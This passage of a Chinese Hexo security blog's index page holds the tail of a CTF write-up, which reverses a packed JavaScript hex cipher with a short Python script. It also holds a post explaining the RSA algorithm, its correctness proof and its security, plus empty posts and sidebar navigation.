   code = code.replace(new RegExp('\\\\b'+dict\[i\]+'\\\\b','g'), ch); 
   if(ch == dict\[i\]) dict\[i\] = ''; 
 } 
 document.getElementById('new\_code').value = "eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d\[e(c)\]=k\[c\]e(c);k=\[function(e){return d\[e\]}\];e=function(){return'\\\\\\\\w+'};c=1};while(c--)if(k\[c\])p=p.replace(new RegExp('\\\\\\\\b'+e(c)+'\\\\\\\\b','g'),k\[c\]);return p}(" 
   + "'"+code+"',"+a+","+len+",'"+ dict.join('')+"'.split(''),0,{}))"; 
} 

function num(c) { 
 return(c<a?'':num(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36)); 
} 

function run() { 
 eval(document.getElementById('code').value); 
} 

function decode() { 
 var code = document.getElementById('code').value; 
 code = code.replace(/^eval/, ''); 
 document.getElementById('new\_code').value = eval(code); 
} 
</script> 

<div>JS文件加密解密</div>
<div>原脚本</div>
<textarea id="code" cols=80 rows=10> 
</textarea>
<div>加密/解密后脚本</div>
<textarea id="new\_code" cols=80 rows=10> 

</textarea>
 <div>
<input type=button onclick=encode() value=编码> 
<input type=button onclick=run() value=执行> 
<input type=button onclick=decode() value=解码> 
</div>

<p>得到：</p>
<p>var flag=’’；<br>var cipher=’’;<br>for(var x=0,y=flag.length,charCode,hexCode;x&lt;y;++x)<br>{<br>charCode=flag.charCodeAt(x);<br>if(charCode&lt;128)<br>charCode+=128;<br>else charCode-=128;<br>charCode=255-charCode;<br>hexCode=charCode.toString(16);<br>if(hexCode.length&lt;2)hexCode=’0’+hexCode;<br>cipher+=hexCode}</p>
<p>阅读源码发现该程序为加密算法，反向编写解密算法：</p>
<p>s = ‘1c4f11460d3e0b0a134b2b1630114a5e’</p>
<p>def decode(s):<br>    charcode = []<br>    i = 0<br>    while i&lt;len(s):<br>        charcode.append(int(s[i:i+2],16))<br>        i = i + 2<br>    charcode = [255-i for i in charcode]</p>
<pre><code>chars = \[\]
for i in charcode:
    if 127&lt;i+128&lt;255:
        chars.append(i+128)
    elif 0&lt;i-128&lt;128:
        chars.append(i-128)
    else: chars.append(i)
result = \[chr(i) for i in chars\]
return &#39;&#39;.join(result)
</code></pre>
<p>t = decode(s)<br>print(t)</p>
<p>得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/543_1.png"></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>从印象笔记里搬过来的wp，第一次做的ctf和第一次写的wp总是特别有纪念意义。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/09/aegis-recruit-writeup/" data-id="ckpw1c6v3001wfww00gxy5km6" data-title="Aegis recruit WriteUp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-rsa公钥密码体系" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/09/rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E7%B3%BB/" class="article-date">
  <time class="dt-published" datetime="2019-10-09T11:40:36.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Crypto/">Crypto</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/09/rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E7%B3%BB/">RSA公钥密码体系</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>RSA公钥密码体系是第一种实用的公钥密码体系，于1977年发布。该密码体系背后的数学原理并不复杂，本文将大致介绍RSA的原理于实现。</p>
<h3 id="RSA算法流程"><a href="#RSA算法流程" class="headerlink" title="RSA算法流程"></a>RSA算法流程</h3><p>生成密钥与加密流程为：</p>
<p>1.选择两个足够大的素数p,q(为保证安全性，p和q位数最好一致)</p>
<p>2.计算</p>
<p>[latex display=’true’]N=pq[/latex]</p>
<p>[latex display=’true’] z = \varphi(N)=(p-1)(q-1)[/latex]</p>
<p>3. 随机选取[latex]1&lt;e&lt;z[/latex]，满足[latex](e,z)=1[/latex]</p>
<p>4. 运用广义欧几里得算法，计算e的乘法逆元[latex]d = \;e^{-1}\;(\;mod \;z)[/latex]， 即使[latex ]de\equiv 1\;(mod \;z)[/latex]。由e与z互素知d存在且唯一。</p>
<p>5.计算</p>
<p>[latex display=’true’ ]c = \; m^{e}\;(mod \; N)[/latex]</p>
<p>其中m为明文，并且需要有[latex]m&lt;N[/latex]，否则需对m进行分组。c为所得密文。(e,N)为公钥，(d,N)为私钥(或仅称d为私钥也可)。</p>
<p>解密流程如下：</p>
<p>1.计算</p>
<p>[latex display = “true”]m = \;c^{d} \;(mod \;N)[/latex]</p>
<p>2.得到明文m</p>
<h3 id="RSA正确性证明"><a href="#RSA正确性证明" class="headerlink" title="RSA正确性证明"></a>RSA正确性证明</h3><p>RSA的证明并不复杂，只需一些基本的初等数论的知识。RSA的正确性等价于下列证明：</p>
<p>[latex display=’true’] \forall \;质数p,q, \; \forall \; 0&lt;m &lt;N,\forall \; 1&lt;e&lt; \varphi(N) \; 满足(e, \varphi(N) ) = 1 \; \\证明: \; m = (m^{e}\;(mod \; N))^{d} \;(mod \; N)\\其中 \; pq=N,de\equiv 1 (mod \; \varphi(N) ) [/latex]</p>
<p>证明如下:</p>
<p>[latex display=’true’]首先证明: \\ (m^{e} (mod \; N))^{d} (mod \; N)=m^{ed}(mod \; N) \\ 由同余定义设: left=c=m^{e}-kN \\ 则有c^{d} \; mod(N)=(m^{e}-kN)^{d} \; (mod N) \\ 展开得: \\ (m^{e}-kN)^{d} \; (mod \; N) \equiv m^{ed}\;(mod \;N) 证毕. \\ 下证: m=(m^{ed}) \; (mod \; N) \\ 由广义欧几里得算法与裴蜀定理得: \\ \exists k\subseteq Z, \; de=1+u \varphi (N) \\ 故: \\ m^{de} \; (mod \; N)=m^{1+u\varphi(N)}\; (mod \; N)=m \cdot m^{u\varphi(N) \; } (mod \; N) \\ 若(m,N)=1,则，由欧拉定理得： m \cdot m^{u\varphi(N) \; } (mod \; N) \equiv m \; (mod \;N)\\若(m,N) 不为1,由N=pq知(m,N)=p或q \\ 不失一般性,设m=kq ,则:\\ m \cdot m^{u\varphi(N) \; } (mod \; N) =m \cdot (kq)^{u\varphi(N)}\;(mod \; N)=m \cdot q^{u\varphi(N)} \cdot k^{u\varphi(N)} \; (mod \; N) \\ 由欧拉定理得: \\ m \cdot q^{u\varphi(N)} \cdot k^{u\varphi(N)} \; (mod \; N) \equiv m \cdot q^{u\varphi(N)} \;(mod \; N)\\又：\\ kp^{u\varphi(N)} \equiv k \; (mod \; N) \\ 同乘q得: \\ mq^{u\varphi(N)} \equiv m \; (mod \; N) \\ 综上所述，有：\\ m=(m^{ed}) \; (mod \; N) 成立,原题得证.[/latex]</p>
<h3 id="RSA体制的可靠性"><a href="#RSA体制的可靠性" class="headerlink" title="RSA体制的可靠性"></a>RSA体制的可靠性</h3><p>RSA公钥密码体系的安全性是基于大整数作唯一算术分解的困难性。若存在某种快速进行质因数分解的算法，攻击者则可以从公钥N中分解出p和q，从而计算欧拉函数(p-1)(q-1)，进一步计算出e，从而达到窃取私钥的目的。但因为大整数的因式分解所需计算量巨大，目前尚无法在有效时间内分解。但该算法的安全性也与所选取的N的大小有关，N的大小若不够，密钥空间就会缩小，则会增大被暴力破解的可能性。</p>
<h3 id="RSA体制实现中的一些问题"><a href="#RSA体制实现中的一些问题" class="headerlink" title="RSA体制实现中的一些问题"></a>RSA体制实现中的一些问题</h3><p>在RSA的算法流程中，需要生成大质数。实际上生成足够大的素数也是很困难的，所以一般多次使用Miller-Rabin素性检验以生成强伪素数，作为生成N的素数。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/09/rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E7%B3%BB/" data-id="ckpw1c6ul000rfww03oxk9xzz" data-title="RSA公钥密码体系" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-275" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/05/275/" class="article-date">
  <time class="dt-published" datetime="2019-10-05T03:24:53.000Z" itemprop="datePublished">2019-10-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/uncategorized/">uncategorized</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/05/275/">Untitled Post - 3</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/05/275/" data-id="ckpw1c6tw0001fww08fiigohs" data-title="Untitled Post - 3" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-273" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/05/273/" class="article-date">
  <time class="dt-published" datetime="2019-10-05T03:24:53.000Z" itemprop="datePublished">2019-10-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/uncategorized/">uncategorized</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/05/273/">Untitled Post - 2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/05/273/" data-id="ckpw1c6u30005fww0akasd8ml" data-title="Untitled Post - 2" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Notes/">Notes</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/uncategorized/">uncategorized</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" rel="tag">sql约束攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" rel="tag">客户端session</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" style="font-size: 10px;">sql约束攻击</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" style="font-size: 10px;">客户端session</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/05/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%85%A8%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2021/05/05/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2020/11/02/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">关于反序列化漏洞的一点思考</a>
          </li>
        
          <li>
            <a href="/2020/05/11/ha1cyon-ctf%E5%B0%8F%E8%AE%B0/">Ha1cyon ctf小记</a>
          </li>
        
          <li>
            <a href="/2020/03/29/xxe%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">XXE任意文件读取</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>